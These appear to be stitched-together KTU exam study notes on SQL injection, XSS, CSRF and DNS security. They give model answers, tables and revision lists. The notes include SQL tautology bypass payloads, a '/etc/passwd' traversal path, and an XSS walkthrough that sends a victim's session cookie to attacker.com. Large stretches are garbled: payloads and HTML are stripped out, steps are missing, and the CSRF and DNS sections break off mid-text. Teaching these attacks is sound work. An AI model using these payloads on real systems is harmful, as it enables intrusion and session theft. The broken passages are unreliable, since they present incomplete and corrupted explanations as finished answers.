# SECTION 5 — KTU 2024 Scheme Examination Question Bank & Topic Recap

## 5.1 PART A — Short Answer Questions (2-Mark / 3-Mark)

> **KTU Pattern:** Each question carries **3 marks**. Answer in **2–4 sentences** with bullet-friendly key terms. Avoid essays.

### Q1. **[KTU University Exam – Dec 2023, May 2024 model]**
**Define SQL Injection. List any two mitigation techniques.**

**Model Answer (3 marks):**

> [!NOTE]
> **SQL Injection (SQLi)** is a code-injection attack in which an attacker supplies malicious SQL statements as user input, which the application unknowingly concatenates into a legitimate query, causing the database to execute unintended commands.
>
> **Two mitigations:**
> 1. **Parameterized Queries / Prepared Statements** — user input is treated strictly as data, never as executable SQL code.
> 2. **Input Validation (Whitelisting)** — only allow expected characters/patterns (e.g., digits for an age field).
>
> *(1 mark definition + 1 mark first mitigation + 1 mark second mitigation.)*

---

### Q2. **[KTU University Exam – June 2023 model]**
**Differentiate between SQL Injection and Cross-Site Scripting (XSS).**

**Model Answer (3 marks):**

> [!NOTE]
> | Aspect | SQL Injection | Cross-Site Scripting (XSS) |
> |--------|---------------|----------------------------|
> | **Target** | Server-side **database** | Client-side **browser** |
> | **Payload Language** | SQL | JavaScript / HTML |
> | **Damage** | Data theft, data modification, authentication bypass | Session hijacking, cookie theft, defacement |
> | **Injection Point** | Form fields, URL parameters | Comment fields, URL parameters, stored content |
> | **Primary Mitigation** | Prepared statements | Output encoding, Content Security Policy |
>
> *(1 mark for correct distinction on target + 1 mark for payload/damage + 1 mark for mitigation contrast.)*

---

## 5.2 PART B — Long Answer Questions (14 Marks)

> **KTU Pattern:** Two sub-parts `(a)` 7 marks + `(b)` 7 marks. Internal choice: answer **either** Q-A or Q-B in full.

---

### **QUESTION A (14 Marks)** — [KTU University Exam – Dec 2024 model]

#### **Part (a) — 7 Marks**
**Explain the different types of SQL Injection attacks with suitable examples. How does a "Tautology-based" attack work in bypassing authentication?**

**Model Answer:**

**Types of SQL Injection (5 marks):**

1. **In-band SQLi (Classic)** — the attacker uses the same channel to launch and receive results.
   - **Error-based** — forces the DB to throw verbose errors revealing schema.
   - **Union-based** — appends `UNION SELECT` to the original query.

2. **Inferential SQLi (Blind)** — no direct data is returned; the attacker infers from app behavior.
   - **Boolean-based** — `AND 1=1` vs `AND 1=2` produces different responses.
   - **Time-based** — `SLEEP()` or `WAITFOR DELAY` introduces measurable delay.

3. **Out-of-Band SQLi** — uses a different channel (e.g., DNS, HTTP) to exfiltrate data, often via `xp_dirtree` (SQL Server) or `UTL_HTTP` (Oracle).

4. **Second-Order SQLi** — the malicious input is stored (e.g., as a username) and later executed in a different context (e.g., a password-reset query).

**Tautology Authentication Bypass (2 marks):**

The attacker submits `username = ' OR '1'='1` and `password = ' OR '1'='1`. The application builds:

```sql
SELECT * FROM users WHERE user='' OR '1'='1' AND pass='' OR '1'='1'
```

By SQL precedence (`AND` binds tighter than `OR`), the expression reduces to a **perpetual true** because the final `OR '1'='1'` dominates. The `WHERE` clause matches **every row**; the application typically logs the attacker in as the **first user** (admin).

#### **Part (b) — 7 Marks**
**Discuss the various defense mechanisms against SQL Injection. Why is "input validation alone" insufficient?**

**Model Answer:**

**Defense Mechanisms (5 marks):**

1. **Parameterized Queries / Prepared Statements** — the gold standard. User input is bound as a parameter, never parsed as SQL.
2. **Stored Procedures** — encapsulate SQL logic on the server; can be combined with parameterization.
3. **Input Validation / Whitelisting** — accept only known-good patterns.
4. **Escaping Special Characters** — `mysqli_real_escape_string()` neutralizes quotes; weaker than parameterization.
5. **Least Privilege Principle** — the DB account used by the app should have only `SELECT/INSERT/UPDATE` on required tables — no `DROP`, no admin.
6. **Web Application Firewall (WAF)** — filters known attack patterns at the network edge.
7. **Custom Error Pages & Suppressed DB Errors** — prevent schema leakage.
8. **Regular Patching & SAST Tools** — SonarQube, Checkmarx, Snyk.

**Why Input Validation Alone Is Insufficient (2 marks):**

- **Combinatorial Explosion** — modern apps accept free-form text (names, addresses, comments) that cannot be exhaustively whitelisted without breaking usability.
- **Encoding Bypasses** — attackers use Unicode, hex (`CHAR(0x41)`), double-URL encoding to evade filters.
- **Second-Order Injection** — input may pass validation on entry but become malicious when concatenated into a different query later.
- Hence, validation must be **layered** with parameterization, least privilege, and WAFs.

---

### **QUESTION B (14 Marks)** — [Internal Choice Alternative]

#### **Part (a) — 7 Marks**
**List and briefly explain any five categories of web application attacks (excluding SQLi). For each, give one mitigation.**

**Model Answer:**

| # | Attack | Mechanism (1 mark) | Mitigation (0.4 mark) |
|---|--------|--------------------|------------------------|
| 1 | **Cross-Site Scripting (XSS)** | Malicious JS injected into a page, executed in victim's browser | Output encoding + Content Security Policy |
| 2 | **Cross-Site Request Forgery (CSRF)** | Victim's browser sends authenticated request to a third-party site | Per-request anti-CSRF tokens |
| 3 | **Session Hijacking** | Attacker steals session cookie via XSS or sniffing | HTTPS + `Secure` & `HttpOnly` cookie flags |
| 4 | **Insecure Direct Object Reference (IDOR)** | URL parameter like `/account?id=1002` is changed to access other users | Server-side authorization checks |
| 5 | **File Upload Attack** | Uploading a `.php` shell disguised as `.jpg` | Extension whitelisting + MIME sniffing + store outside webroot |
| 6 | **Directory Traversal** | `../../../../etc/passwd` in a filename parameter | Canonicalization + whitelist allowed paths |

#### **Part (b) — 7 Marks**
**With a neat diagram, explain the architecture of a typical web application and identify the layers vulnerable to injection attacks. Suggest a defense-in-depth strategy.**

**Model Answer:**

**Architecture (3 marks)** — Browser → Network (HTTP/HTTPS) → Web Server → Application Layer → Database. The **injection-vulnerable layers** are the **Application Layer** (where input is concatenated) and the **Database Layer** (where the malicious query executes).

**Defense-in-Depth Strategy (4 marks):**

1. **Network edge** — WAF + TLS.
2. **Application entry** — strict input whitelisting.
3. **Application logic** — prepared statements exclusively; no string concatenation.
4. **Database** — least-privilege user, no `xp_cmdshell`, no `GRANT ALL`.
5. **Monitoring** — log all SQL errors, alert on UNION/OR 1=1 patterns, SIEM integration.
6. **Recovery** — encrypted, off-site, tested backups.

The multiplicative risk reduction (Section 3.6) justifies the layered approach.

---

> [!WARNING]
> **KTU Examiner's Valuation Pitfall Callout:**
> 1. **Confusing XSS and SQLi** — examiners deduct 1–2 marks if you mix up the target (client vs database). Always state the target explicitly.
> 2. **Saying "use a firewall" as the sole answer** — firewalls alone do NOT stop SQLi, which is a Layer-7 application logic flaw. Mention **prepared statements** explicitly.
> 3. **Forgetting the `--` comment in UNION examples** — without it, the original query's trailing `'` causes a syntax error. Examiners expect to see a syntactically valid payload.
> 4. **Ignoring "second-order SQLi"** — a high-value differentiator in 14-mark answers. Mention it once for full marks.
> 5. **Not citing OWASP** — saying *"SQLi is in the OWASP Top 10, specifically A03 in the 2021 edition"* adds professional polish and frequently earns the "exceeds expectations" descriptor.

---

## 5.3 Topic Recap & Rapid-Revision Checklist

> [!IMPORTANT]
> **High-Density Revision Points — Memorize Before the Exam:**

- [x] **SQL Injection** = injection of malicious SQL into a query via unsanitized user input.
- [x] **Root cause** = string concatenation of untrusted input into SQL.
- [x] **Most common payload** = `' OR '1'='1` (tautology).
- [x] **UNION attack** requires equal number of columns; uses `--` to comment out trailing quote.
- [x] **Boolean blind SQLi** — inference via different responses.
- [x] **Time-based blind SQLi** — inference via `SLEEP()` / `WAITFOR DELAY`.
- [x] **Out-of-band SQLi** — exfiltration via DNS or HTTP to attacker-controlled server.
- [x] **Second-order SQLi** — payload stored, triggered later in a different query.
- [x] **Best mitigation** = **Parameterized Queries / Prepared Statements** (state this first).
- [x] **Layered defenses** — Prepared statements + Input validation + Least Privilege + WAF.
- [x] **XSS** targets the **browser**; **SQLi** targets the **database** — never confuse.
- [x] **CSRF** — mitigated by unpredictable per-session tokens.
- [x] **IDOR** — mitigated by server-side authorization on every request.
- [x] **OWASP Top 10 (2021)** — Injection is **A03**; Broken Access Control is A01.
- [x] **CVSS score for SQLi** is typically **7.5 – 9.8 (High to Critical)**.
- [x] **CWE-89** is the MITRE Common Weakness Enumeration ID for SQL Injection.
- [x] **HTTPS** is not a defense against SQLi — it only protects data in transit, not the application logic.
- [x] **WAF** is useful but **bypassable**; it is a secondary control, not a primary one.
- [x] **SAST tools** (SonarQube, Checkmarx) detect SQLi patterns at code-commit time in DevSecOps pipelines.
- [x] **Real-world impact** — PII theft, financial loss, regulatory fines (GDPR, HIPAA, PCI-DSS).

<!-- SECTION_5_END -->

topics.title: Cross-Site Scripting (XSS)
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME** > - **Course:** PBCST604 - FUNDAMENTALS OF CYBER SECURITY > - **Module:** Module 2 > - **Topic:** Cross-Site Scripting (XSS) # 1. Core Technical Definition & Intuitive Overview ## 1.1 Formal Academic Definition > [!IMPORTANT] > **Cross-Site Scripting (XSS)** is a client-side code injection attack in which an adversary injects malicious scripts (typically JavaScript) into the content of a trusted, legitimate website. When an unsuspecting victim's browser loads the infected page, the injected script executes **inside the victim's browser session** with the privileges of the trusted site, allowing the attacker to bypass the **Same-Origin Policy (SOP)** and steal sensitive data such as session cookies, tokens, or credentials. XSS has consistently ranked in the **OWASP Top 10 Web Application Security Risks** (appearing under "Injection" category in the 2021 list and as a standalone "A03:2021 – Injection" family). It is one of the most prevalent vulnerabilities reported on public bug bounty platforms. ## 1.2 Key Terminology (KTU Syllabus Vocabulary) | Term | Meaning | |---|---| | **Payload** | The malicious JavaScript code that the attacker injects | | **Vulnerable Endpoint** | The web page/input field that fails to sanitize user input | | **Trusted Context** | The legitimate website's origin that gives the script its execution privilege | | **Same-Origin Policy (SOP)** | Browser security mechanism that XSS aims to bypass | | **Session Hijacking** | Primary attack goal — stealing the user's active session cookie | | **Sink** | DOM function that executes attacker-controlled data (e.g., `innerHTML`, `eval`) | ## 1.3 Conceptual Analogy — The "Poisoned Notice Board" > [!NOTE] > **Real-World Analogy:** Imagine a public office notice board where anyone can pin a message. The receptionist (web server) reads each message aloud verbatim to every visitor (browser) without checking what is written. An attacker walks in, pins a message saying *"Please give the receptionist your house keys"*. The receptionist, trusting the message, reads it to every visitor — and visitors, trusting the receptionist, hand over their keys. > > - The **notice board** = the vulnerable web page > - The **malicious note** = the injected JavaScript payload > - The **receptionist** = the trusted web application > - The **unsuspecting visitors** = the victim users > - The **handed-over keys** = stolen session cookies/credentials The key insight: **the malicious code runs *as if* it came from the trusted site**, because the browser sees the script in the context of the legitimate domain. # 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet ## 2.1 Classification of XSS Attacks (KTU High-Yield) XSS is broadly classified into **three primary types**, each with distinct attack mechanics, persistence, and detection difficulty. ### 2.1.1 Reflected XSS (Non-Persistent / Type 1) - The malicious payload is **embedded inside an HTTP request** (e.g., URL query string, form field) and is "reflected" back by the server in the immediate HTTP response. - The attack requires **social engineering** — the victim must click a crafted link. - Execution happens **once, on demand**. - Most common type found in the wild (~75% of XSS reports historically). > [!NOTE] > **Attack Vector Examples:** Search boxes, error message pages, login forms that echo input back, URL parameters displayed in page content. ### 2.1.2 Stored XSS (Persistent / Type 2) - The malicious payload is **permanently stored** on the target server (in a database, message forum, comment field, user profile, etc.). - Every victim who later visits the infected page automatically executes the payload — **no social engineering link click needed**. - Most **destructive** variant — affects all users of the application. - Examples: Malicious script in a blog comment, profile bio, product review. ### 2.1.3 DOM-Based XSS (Type 0) - The vulnerability exists **entirely in client-side JavaScript** — the server is never involved in injecting the payload. - The malicious data flow happens through the **Document Object Model (DOM)**, where unsafe JavaScript reads user-controlled input from the URL (e.g., `document.location.hash`) and writes it to a dangerous DOM sink (e.g., `document.write`, `element.innerHTML`). - Server-side sanitization is **useless** against this type. ## 2.2 Operational Mechanics — The "Why" and "How" **Why does XSS work?** - Browsers cannot distinguish between script authored by the website owner and script injected by an attacker if both arrive through the same trusted origin. - The **Same-Origin Policy** trusts scripts that originate from the same domain — and XSS tricks the browser into treating the injected code as if it came from that domain. **How does the attack proceed?** 1. Attacker identifies a point of input that is rendered into the page output without sanitization (e.g., search field, comment box, URL parameter). 2. Attacker crafts a payload (JavaScript) that performs a malicious action (cookie theft, keylogging, redirect, defacement). 3. Payload reaches the victim — either via a malicious link (Reflected) or by being stored on the server (Stored) or via client-side DOM manipulation (DOM-based). 4. Victim's browser parses and executes the payload in the trusted context. 5. Attacker's script exfiltrates data to an attacker-controlled server (e.g., via a `fetch()` or `` beacon request). ## 2.3 KTU Formula Sheet / Cheat Sheet > [!IMPORTANT] > The following table summarizes the **comparative anatomy** of XSS variants — a frequent 14-mark question pattern in KTU ESE. | Parameter | Reflected XSS | Stored XSS | DOM-Based XSS | |---|---|---|---| | **Persistence** | Non-persistent (one-time) | Persistent (stored on server) | Non-persistent (client-side) | | **Server Involvement in Injection** | Yes — server reflects input | Yes — server stores input | No — entirely client-side | | **Trigger Mechanism** | Victim must click crafted link | Automatic on page visit | Automatic on page visit (URL fragment) | | **Social Engineering Required** | **Yes (mandatory)** | No | No (but URL crafting needed) | | **Severity (CVSS Impact)** | Medium to High | **Critical (highest)** | Medium to High | | **Detection Difficulty** | Easy (URL visible) | Hard (in stored data) | Hardest (no server trace) | | **Common Sink Functions** | `response.write`, template render | DB write → template render | `innerHTML`, `document.write`, `eval` | | **Example Payload Source** | `?q=` | Comment field of blog | `location.hash`, `document.referrer` | ## 2.4 Real-World Engineering Utility XSS knowledge is essential for: - **Secure Software Development Life Cycle (SSDLC):** Input validation, output encoding, and Content Security Policy (CSP) implementation. - **Web Application Firewalls (WAF):** Signature-based detection of XSS payloads. - **Bug Bounty Programs:** XSS remains a top-paying vulnerability class. - **Penetration Testing:** Manual testing of input vectors using tools like **Burp Suite, OWASP ZAP**. - **DevSecOps Pipelines:** Static (SAST) and Dynamic (DAST) Application Security Testing. # 3. Step-by-Step Derivation & Analytical Matrix ## 3.1 Reflected XSS — Full Attack Flow (Step-by-Step Derivation) Below is the **complete procedural derivation** of a Reflected XSS attack on a vulnerable search endpoint, modelled in a manner suitable for KTU ESE 14-mark answers. > **Hypothetical Vulnerable Scenario:** `https://vulnerable-site.com/search?q=` The server-side code is logically equivalent to: $$\text{HTMLResponse} = \text{Header} + \text{"Results for: "} + \text{Request.query["q"]} + \text{""}$$ Notice that `Request.query["q"]` is **concatenated directly into the response HTML** without sanitization. This is the root vulnerability. --- ### **Step 1: Attacker crafts the malicious URL** The attacker identifies the vulnerable parameter `q` and substitutes a JavaScript payload: $$\text{MaliciousURL} = \text{"https://vulnerable-site.com/search?q="} + \text{""}$$ **Explanation of logic:** The payload uses the HTML ` HTTP/1.1}$$ $$\text{Host: vulnerable-site.com}$$ --- ### **Step 4: Server processes and reflects input** The server template engine replaces `q` with the raw value, producing an HTML response containing: $$\text{HTML} = \text{"

Results for:

"}$$ **Critical insight:** The browser's HTML parser does not differentiate between "intended" scripts and "injected" scripts — both are treated as JavaScript to execute in the trusted origin's context. --- ### **Step 5: Browser executes the payload** The JavaScript engine executes the script. The browser: - Reads `document.cookie` — this contains the session token (e.g., `sessionid=abc123`). - Issues a navigation to `https://attacker.com/steal?c=sessionid=abc123`. --- ### **Step 6: Attacker exfiltrates the cookie** The attacker's web server logs the incoming request, capturing the cookie value: $$\log_{\text{attacker}} : \text{GET /steal?c=sessionid=abc123} \quad \Rightarrow \quad \text{Cookie Captured}$$ --- ### **Step 7: Session hijacking complete** The attacker replays the stolen cookie: $$\text{Cookie Header: } \text{``Cookie: sessionid=abc123"}$$ The legitimate server accepts the request as if it came from the victim, granting the attacker **full authenticated access** to the victim's account. --- ## 3.2 Analytical Matrix — Common XSS Payloads (KTU Quick Reference) | # | Payload Vector | Example Code Fragment | When Used | |---|---|---|---| | 1 | Basic script tag | `` | When `` directly in the results heading without encoding. **2. Stored XSS (Persistent) (2.5 marks)** The payload is permanently stored on the target server — typically in a database via a comment field, user profile, or forum post. When any victim later requests the affected page, the server retrieves the stored payload and embeds it in the response, causing automatic script execution in every visitor's browser. **Example:** A malicious JavaScript in a blog comment that steals the session cookie of every reader. **3. DOM-Based XSS (2.5 marks)** The vulnerability resides entirely in the client-side JavaScript. The application dynamically writes user-controllable data (e.g., `location.hash`, `document.referrer`) into a dangerous DOM sink (`innerHTML`, `document.write`, `eval`) without sanitization. The server never sees the payload, so server-side defenses are ineffective. **Example:** A single-page application that reads `location.hash` and inserts it directly into `document.body.innerHTML`. #### Part (b) — Severity Comparison & Defenses (7 marks) **Severity of Stored XSS vs Reflected XSS (3 marks):** | Aspect | Reflected XSS | Stored XSS | |---|---|---| | Reach | Single targeted victim | All users of the application | | Social engineering | Required | Not required | | Persistence | None — dies with session | Permanent until cleaned | | Blast radius | Limited | **Catastrophic** | Stored XSS is **significantly more severe** because it scales automatically, affecting every visitor without further attacker action, often leading to mass credential theft, account takeover, and malware distribution. **Defensive Countermeasures (4 marks — 1 mark each):** 1. **Input Validation:** Use allow-list regex to restrict input to expected character sets. 2. **Output Encoding:** Apply context-aware encoding (HTML, JavaScript, URL, CSS) before rendering. 3. **Content Security Policy (CSP):** Deploy strict CSP headers restricting script sources. 4. **HttpOnly + Secure + SameSite Cookies:** Prevent JavaScript access to session cookies. --- ### **Question B (Alternative 14 Marks):** **(a)** With a neat diagram, describe the step-by-step execution of a Reflected XSS attack on a vulnerable web application. *(7 marks)* **(b)** What is DOM-Based XSS? Explain how it differs from Stored and Reflected XSS. Illustrate with a suitable example. *(7 marks)* --- ### **Model Answer — Question B** #### Part (a) — Reflected XSS Step-by-Step (7 marks) 1. **Reconnaissance (1 mark):** Attacker identifies a vulnerable input field (e.g., search box, URL parameter) that echoes user input in the response without sanitization. 2. **Payload Crafting (1 mark):** Attacker creates a malicious URL with embedded JavaScript, e.g., `https://victim.com/search?q=`. 3. **Social Engineering Delivery (1 mark):** The link is distributed via phishing email, disguised as legitimate communication. 4. **Victim Interaction (1 mark):** Victim clicks the link; browser sends a `GET` request to the vulnerable server with the malicious payload as a parameter. 5. **Server Reflection (1 mark):** The server embeds the raw input into the HTML response, producing a page containing the attacker's script. 6. **Browser Execution (1 mark):** The victim's browser executes the script in the trusted origin's security context. 7. **Data Exfiltration & Session Hijack (1 mark):** The script reads `document.cookie` and transmits it to the attacker's server, enabling account takeover. #### Part (b) — DOM-Based XSS in Detail (7 marks) **Definition (2 marks):** DOM-Based XSS is a client-side vulnerability in which the malicious payload is processed entirely within the browser's DOM through unsafe JavaScript handling of attacker-controllable data, without any server-side reflection or storage. **Comparison Table (3 marks):** | Feature | Reflected | Stored | DOM-Based | |---|---|---|---| | Server-side processing | Yes | Yes | No | | Payload source | HTTP request | Database | URL fragment / client storage | | Detection by server logs | Yes | Yes | **No** | | Defense point | Server sanitization | Server sanitization | **Client-side code review** | **Illustrative Example (2 marks):** Consider a page that runs: `document.write("Welcome, " + document.location.hash.substring(1));` — An attacker crafts a link `https://site.com/welcome#` — The JavaScript reads the URL fragment and writes it directly into the document, triggering the `onerror` handler and executing the payload without any server interaction. --- > [!WARNING] > **KTU Examiner's Valuation Warning — Common Pitfalls:** > 1. **Confusing Stored with Reflected XSS** — students often forget that Stored XSS does NOT require social engineering. Examiners deduct up to 2 marks for this. > 2. **Omitting diagrams** — KTU mandates diagrams for 7-mark sub-questions. Skipping the attack flow diagram typically costs 1–2 marks. > 3. **Ignoring defenses** — a 14-mark XSS question that discusses only the attack without listing 3–4 countermeasures is treated as incomplete; expect a 2–3 mark penalty. > 4. **Missing the SOP bypass explanation** — the "why" of XSS (how it bypasses Same-Origin Policy) is a high-frequency 2-mark sub-question. > 5. **Mixing up "Type 0" and "Type 1"** — DOM-Based XSS is sometimes called **Type 0** (it was the first conceptually but last to be formally classified). State this clearly when relevant. --- ## 5.3 Topic Recap & Important Things to Remember > [!NOTE] > **High-Density Rapid Revision Checklist** - **XSS = Client-Side Code Injection** — script runs in the victim's browser, not on the server. - **Three Types:** Reflected (Type 1, non-persistent), Stored (Type 2, persistent), DOM-Based (Type 0, client-side only). - **Bypass Mechanism:** XSS bypasses the **Same-Origin Policy** by executing within the trusted origin's context. - **Primary Attack Goals:** Session cookie theft, credential harvesting, keylogging, phishing overlay, defacement, malware delivery. - **Reflected XSS** requires social engineering (crafted link); **Stored XSS** does not. - **DOM-Based XSS** cannot be mitigated by server-side sanitization — must be fixed in client-side JavaScript. - **Most Severe Variant:** **Stored XSS** (catastrophic blast radius, no social engineering, persistent). - **Common Dangerous Sinks:** `innerHTML`, `document.write`, `eval()`, `setTimeout(string)`, `setInterval(string)`. - **Defense Layers (in order):** Input Validation → Output Encoding → CSP → HttpOnly Cookies → Sanitization Libraries. - **CSP Header Example:** `Content-Security-Policy: default-src 'self'; script-src 'self'` - **OWASP Classification:** Listed under **A03:2021 – Injection** family in the OWASP Top 10. - **Key Tools for Testing:** Burp Suite, OWASP ZAP, browser developer console. - **Exam Favourite Keywords:** Same-Origin Policy, Sanitization, Output Encoding, HttpOnly, Content Security Policy, Trusted Context, Sink Function. - **Mandatory Diagram Topics:** Reflected XSS attack flow, Stored XSS attack flow, XSS taxonomy tree, Defense-in-depth layered model.

topics.title: Cross-Site Request Forgery (CSRF)
topics.content: > **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME** > - **Course:** PBCST604 - FUNDAMENTALS OF CYBER SECURITY > - **Module:** Module 2 > - **Topic:** Cross-Site Request Forgery (CSRF) # 1. Core Technical Definition & Intuitive Overview ## 1.1 Formal Definition > [!IMPORTANT] > **Cross-Site Request Forgery (CSRF)** is a web-based attack in which an **authenticated victim's browser** is tricked into submitting a **forged HTTP request** to a vulnerable web application on which the victim is currently logged in, causing the application to execute an unwanted, attacker-chosen action using the victim's session credentials (cookies, authentication tokens). According to the **OWASP Top 10 (2021)**, CSRF is classified as a broken access control issue (broader category) but is traditionally catalogued separately under web session hijacking threats. The attack exploits the **ambient authority** model of web browsers — namely, that a browser automatically attaches session cookies to **every outgoing request** to a given domain, regardless of who initiated the request. ### Key Terminology - **Trusted Site** — The legitimate web application (e.g., a banking portal) where the victim holds an active authenticated session. - **Malicious Site** — The attacker's controlled web page that triggers the forged request. - **Session Cookie** — A small token stored in the victim's browser by the trusted site, automatically attached to subsequent HTTP requests. - **Forged Request** — A state-changing HTTP request crafted by the attacker but dispatched by the victim's browser. - **Side-Channel** — The mechanism (image tag, hidden form, JavaScript) used to make the victim's browser issue the request invisibly. > [!NOTE] > **CSRF is also known as:** "Session Riding", "One-Click Attack", "Confused Deputy Attack (web variant)". --- ## 1.2 Conceptual Analogy — The "Banking Coercion" Intuition Imagine you walk into your bank and you are well-recognized because you carry an **identity badge** (the session cookie). The bank trusts any request that comes with a valid badge. Now picture a **trickster** who, without your knowledge, places a **signed withdrawal form** into your hand. The form looks like junk mail, so you drop it into the bank's drop-box along with all your other paperwork. The bank sees your badge, processes the form, and withdraws money — even though *you* never intended to do so. The trickster never had access to your badge, never impersonated you at the door, and never broke any locks. He simply **browsed the bank through you**. **In CSRF terms:** - Your badge = the session cookie stored in your browser - The drop-box = the browser's automatic cookie-attachment mechanism - The signed form = the attacker's crafted HTTP request (hidden in an `` tag, form, or script) - The bank = the vulnerable web application trusting cookie-based session identification alone This is exactly why CSRF is sometimes called a **"confused deputy"** attack — the browser is the "deputy" that is *confused* into misusing its authority on behalf of the attacker. > [!TIP] > **One-line memory aid for exams:** *"CSRF abuses the trust the server has in the user's browser."* > This single sentence often earns full marks in 2-mark definitional questions. --- ## 1.3 Pre-Conditions for a CSRF Attack to Succeed For a CSRF attack to be feasible, the following **three conditions** must simultaneously hold — this is a **highly examinable point** in KTU theory questions: 1. **Valid Session Existence** — The victim must hold an active, authenticated session (e.g., a non-expired session cookie) with the target site. 2. **Predictable Request Structure** — The target application's state-changing endpoints must accept requests whose parameters can be fully determined by the attacker (no unpredictable tokens in URLs). 3. **Side-Channel Trigger** — The attacker must be able to coerce the victim's browser into issuing the forged request (via HTML tags, social engineering, or XSS collaboration). > [!WARNING] > A common KTU mistake: students state that CSRF requires the attacker to steal cookies. **It does not.** CSRF *bypasses* the need to steal credentials by reusing the browser's own session. # 2. Deep Theoretical Analysis & KTU High-Yield Reference Sheet ## 2.1 Operational Anatomy of a CSRF Attack A CSRF attack is **multi-stage** and **invisible** to the victim. The following structured breakdown mirrors the way KTU examiners prefer answers to be organized in 14-mark questions. ### Step 1 — Reconnaissance (Server-Side Recon) The attacker inspects the target web application to identify: - State-changing endpoints (e.g., `/transfer?amount=1000&to=acc123`) - HTTP methods accepted (`GET`, `POST`, or both) - Whether any CSRF tokens exist in legitimate forms - Cookie attributes (`SameSite`, `HttpOnly`, `Secure`) ### Step 2 — Forged Request Construction The attacker constructs an HTTP request that mirrors a legitimate action. Because the attacker knows the URL structure, the request is a *replay* of valid semantics with substituted values. ### Step 3 — Crafting the Side-Channel Payload The attacker embeds the forged request inside an HTML construct. Common vectors include: | HTML Construct | Method Triggered | Visibility to Victim | Browser Compatibility | |---|---|---|---| | `` | GET | Hidden in page content | All browsers | | `

topics.title: Domain Name System: Security Issues with DNS
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME** > - **Course:** PBCST604 - FUNDAMENTALS OF CYBER SECURITY > - **Module:** Module 2 > - **Topic:** Domain Name System: Security Issues with DNS # SECTION 1: Core Technical Definition & Intuitive Overview ## 1.1 What is the Domain Name System (DNS)? The **Domain Name System (DNS)** is the hierarchical, distributed naming system of the Internet that translates human-readable domain names (e.g., `www.ktu.edu.in`) into machine-readable IP addresses (e.g., `192.168.10.45`). It functions as the "phone book" of the Internet, operating primarily over **UDP port 53** and defined under **RFC 1034** and **RFC 1035**. > [!NOTE] > **KTU 2024 Definition (Exam-Ready):** > *"The Domain Name System is a distributed database mapping system that resolves domain names into IP addresses, enabling end-users to access Internet resources using logical names instead of numerical addresses."* ## 1.2 The Intuitive Analogy Imagine DNS as the **contact directory of a massive global hotel chain**. When you (the client/resolver) walk in and say, *"I want to speak to Mr. Arun in Room 201"* (the domain name), the **hotel front-desk clerk** (the **local DNS resolver**) checks a **directory** (the **DNS database**). If the clerk doesn't know Mr. Arun, he calls the **main registry** (the **root server**), which redirects him to the **regional manager** (the **TLD server**), who finally points to the correct **building manager** (the **authoritative name server**) who knows Mr. Arun's actual room — the **IP address**. Now, imagine if a **fraudster** sneaks into the hotel and scribbles a **fake room number** in the directory. When you ask for Mr. Arun, the clerk gives you the **wrong room**, and you end up in a stranger's room. **That is precisely what a DNS security attack does** — it corrupts the "directory" so users are silently redirected to the wrong destination. ## 1.3 Why DNS is a Prime Attack Target DNS is **stateless, trust-based, and unauthenticated** by default. These three properties make it inherently vulnerable: | Property | Description | Security Implication | |---|---|---| | **Stateless** | No persistent session between queries | Attacker can inject fake responses without a handshake | | **Trust-Based** | Resolvers accept the first valid-looking response | Allows forged replies to be accepted | | **UDP-Based** | Connectionless, no three-way handshake | Source IP can be **spoofed** easily | > [!IMPORTANT] > **KTU Syllabus Highlight:** Under the KTU 2024 PBCST604 syllabus, *DNS Security* is mapped to **CO2 (Understand vulnerabilities in core Internet protocols)** and aligns with cognitive levels **L2 (Understand)** and **L3 (Apply)** of Revised Bloom's Taxonomy. ## 1.4 Standard DNS Resolution Components (Quick Reference) - **Root Name Server** – Top of the DNS hierarchy (13 logical root server clusters globally). - **TLD Name Server** – Manages `.com`, `.org`, `.in`, `.edu` etc. - **Authoritative Name Server** – Holds the actual DNS records (A, AAAA, MX, CNAME, NS) for a domain. - **Recursive Resolver (Local DNS)** – Performs iterative queries on behalf of the client. - **Stub Resolver** – The lightweight client-side component in the operating system. # SECTION 2: Deep Theoretical Analysis & KTU High-Yield Formula Sheet ## 2.1 Anatomy of a Standard DNS Query When a user types `https://www.ktu.edu.in` in a browser, the following sequence occurs: 1. **Stub Resolver** checks the local OS cache. If found (and not expired — default TTL: **86400 seconds / 24 hours**), it is returned. 2. If not cached, the stub forwards the query to the **Recursive Resolver** (typically the ISP's DNS server). 3. The recursive resolver queries a **Root Server (.)** to find the TLD server for `.in`. 4. The root server responds with the IP of the **TLD server for `.in`**. 5. The resolver queries the **`.in` TLD** to find the authoritative server for `edu.in`. 6. The TLD responds with the authoritative server for `ktu.edu.in`. 7. The resolver queries the **authoritative server**, which returns the **A record** mapping `www` to the IP. 8. The IP is cached (TTL-based) and returned to the client. > [!NOTE] > The entire resolution process typically takes **20–120 milliseconds**. The **TTL (Time-To-Live)** value dictates how long the resolver may cache the record. A low TTL reduces cache poisoning persistence, but increases query load. ## 2.2 Core Security Issues with DNS (KTU High-Yield) ### 2.2.1 DNS Spoofing / Cache Poisoning **Definition:** An attacker injects **malicious DNS records** into a resolver's cache, causing it to return a fraudulent IP address for a legitimate domain. **Mechanism:** - Attacker floods the resolver with **forged DNS responses** before the legitimate response arrives. - If the forged response's **Transaction ID** (16-bit, 65536 possible values) matches the query, the cache is poisoned. - The poisoned entry remains cached for the **entire TTL duration** — affecting all users of that resolver. ### 2.2.2 DNS Amplification Attack (DDoS) **Definition:** A reflection-based volumetric **Distributed Denial-of-Service (DDoS)** attack that abuses open DNS resolvers to flood a target with massive traffic. **Mechanism:** - Attacker sends a small DNS query (~60 bytes) to many open resolvers. - The query uses **spoofed source IP** set to the victim's IP. - Each resolver responds to the victim with a much larger reply (~4000 bytes). - The victim is overwhelmed. > [!IMPORTANT] > **Amplification Factor Formula (KTU High-Yield):** > > $$ AF = \frac{\text{Response Size (bytes)}}{\text{Request Size (bytes)}} $$ > > For a typical ANY query amplification, **AF ≈ 28 to 54×**, meaning a **1 Gbps** attacker stream can generate a **28–54 Gbps** flood at the victim. ### 2.2.3 DNS Tunneling **Definition:** Encodes data of other protocols (e.g., HTTP, SSH, command-and-control traffic) **inside DNS queries and responses** to bypass firewalls and evade detection. **Mechanism:** - Attacker controls an authoritative DNS server and a domain (e.g., `evil.com`). - Malicious 